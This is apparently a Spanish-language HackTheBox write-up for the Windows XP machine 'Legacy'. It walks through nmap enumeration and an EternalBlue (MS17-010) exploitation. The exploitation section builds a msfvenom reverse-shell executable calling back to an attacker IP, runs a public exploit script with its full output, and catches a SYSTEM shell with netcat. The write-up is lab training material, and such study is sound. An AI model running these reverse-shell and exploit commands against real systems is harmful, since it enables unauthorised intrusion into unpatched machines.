---
title: HTB - Legacy
published: true
categories: [Windows]
tags: [eJPT, OSCP, Fácil]
---

<img src="/assets/HTB/Legacy/legacy.png">

¡Hola!
Vamos a resolver de la máquina `Legacy` de dificultad "Fácil" de la plataforma [HackTheBox](https://hackthebox.com/).

Técnicas Vistas: 

- **SMB Enumeration**
- **Eternalblue Exploitation (MS17-010)**

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Legacy`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 10.10.10.4
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=42.3 ms

--- 10.10.10.4 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Windows** debido a su ttl (time to live) correspondiente a 127 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```java
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG allPorts

PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127
```
Luego de identificar los puertos abiertos `OPEN`, se procede a escanear servicios y versiones que puedan estar corriendo en los puertos abiertos detectados.

```java
nmap -sCV -p135,139,445 10.10.10.4 -oN targeted

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h57m38s, deviation: 1h24m51s, median: 4d23h57m38s
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:96:9f:c3 (VMware)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-11-07T13:45:00+02:00
```
Vemos un Windows XP en los resultados por lo que con la herramienta nmap vamos a realizar un escaneo de vulnerabilidades

```java
❯ nmap --script "vuln and safe" 10.10.10.4
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-02 11:24 CET
Nmap scan report for 10.10.10.4
Host is up (0.044s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

Nmap nos confirma que la máquina víctima es vulnerable a **Eternal Blue**

### Explotación Eternal Blue

* * *

Para la explotación de esta vulnerabilidad vamos a utilizar el repositorio de GitHub de [k4u5h41](https://github.com/k4u5h41/MS17-010_CVE-2017-0143)

Una vez clonado nos metemos dentro de la carpeta del repositorio y ejecutamos la herramienta `checker.py` para comprobar que no esté parcheado

```java
❯ python2 checker.py 10.10.10.4 445
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
```
Lo siguiente será crear un archivo ejecutable malicioso con la herramienta `msfvenom`

```java
❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.64 LPORT=443 -f exe > shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Para acabar la explotación creamos un listener con netcat escuchando en el puerto 443 y con la herramienta del repositorio clonado `send_and_execute.py` enviamos y ejectuamos el archivo malicioso creado anteriormente

```java
❯ python2 send_and_execute.py 10.10.10.4 shell.exe 445 browser
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86030660
SESSION: 0xe119b940
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe10904b8
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe1090558
overwriting token UserAndGroups
Sending file 4O9N3T.exe...
Opening SVCManager on 10.10.10.4.....
Creating service sXzA.....
Starting service sXzA.....
The NETBIOS connection with the remote host timed out.
Removing service sXzA.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

```java
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.64] from (UNKNOWN) [10.10.10.4] 1047
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```
Hemos conseguido una shell con la máquina víctima y con privilegios de root. Ya sólo nos queda buscar las flags

### Flags

* * *

Tras una búsqueda desde la raíz localizamos las flags en sus respectivos directorios. Con el comando `type` nos muestra el contenido.

```bash
#USER
cd c:\
dir /b/s user.txt
C:\Documents and Settings\john\Desktop\user.txt
cd C:\Documents and Settings\john\Desktop
type user.txt
e69af0e4f443de7e3***************
```

```bash
#ROOT
dir /b/s root.txt
C:\Documents and Settings\Administrator\Desktop\root.txt
cd C:\Documents and Settings\john\Desktop
type root.txt
993442d258b0e0ec9***************
```

Hemos completado la máquina **Legacy** de HackTheBox!! Happy Hacking!!


<img src="/assets/HTB/Legacy/pwned.png">
